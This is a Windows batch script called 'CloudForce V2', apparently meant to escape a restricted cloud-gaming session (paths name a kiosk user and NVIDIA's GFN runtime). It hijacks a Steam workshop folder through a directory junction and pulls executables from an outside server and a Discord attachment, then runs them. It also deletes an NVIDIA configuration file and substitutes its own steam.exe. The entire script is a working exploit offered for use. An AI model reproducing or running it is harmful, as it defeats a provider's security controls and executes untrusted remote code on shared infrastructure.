@ECHO OFF 
COLOR 
TITLE CloudForce V2
C: 
CD "C:\Program Files (x86)\Steam" 
SETLOCAL
CALL :setESC
:MAIN
ECHO %ESC%[42mInitializing CloudForce V2.0%ESC%[0m
ECHO %ESC%[44mThanks to EricPlayZ for the method!%ESC%[0m
start "" "steam.exe" "steam://rungameid/382490/"
MD "B:\CloudForce" >NUL 2>&1
CD "%PROGRAMFILES(X86)%\Steam\steamapps\workshop\content"
MKLINK /J 382490 B:\CloudForce >NUL 2>&1
:loop 
IF EXIST "B:\CloudForce\2286097686\downloader.exe" GOTO :found 
GOTO :loop 
:found 
CLS
ECHO %ESC%[46mDownloading CloudForce!%ESC%[0m
TIMEOUT 5 /NOBREAK >NUL
REN "B:\CloudForce\2286097686" download >NUL 2>&1
B: 
CD "B:\CloudForce"
SET DL="B:\CloudForce\download\downloader.exe" >NUL 2>&1
%DL% -LJOk "https://server2.cloudforce-now.org/DiscordRPC.dll" >NUL 2>&1
%DL% -LJOk "https://server2.cloudforce-now.org/CloudForce.exe" >NUL 2>&1
%DL% -LJOk "https://server2.cloudforce-now.org/Newtonsoft.Json.dll" >NUL 2>&1
%DL% -LJOk "https://server2.cloudforce-now.org/System.IO.Compression.FileSystem.dll" >NUL 2>&1
START "" "B:\CloudForce\CloudForce.exe" 
DEL "C:\Users\kiosk\AppData\Local\NVIDIA Corporation\GfnRuntimeSdk\GFNSDK_Steam.json"
MD "B:\CloudForce\Steam" 
CD "B:\CloudForce\Steam" 
%DL% -LJOk "https://cdn.discordapp.com/attachments/741059833163153469/763423169230667816/steam.exe" >NUL 2>&1
TSKILL steam >NUL 2>&1
START "" B:\CloudForce\Steam\steam.exe 
MOVE "C:\Program Files (x86)\Steam\steam.exe.old" "C:\Program Files (x86)\Steam\steamapps\common\Steamworks Shared\_CommonRedist\OpenAL\2.0.7.0\steam.exe.old" >NUL 2>&1
START "" "C:\Program Files (x86)\Steam\steamapps\common\Steamworks Shared\_CommonRedist\OpenAL\2.0.7.0\steam.exe.old" 
EXIT 

:setESC
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set ESC=%%b
)
GOTO :MAIN
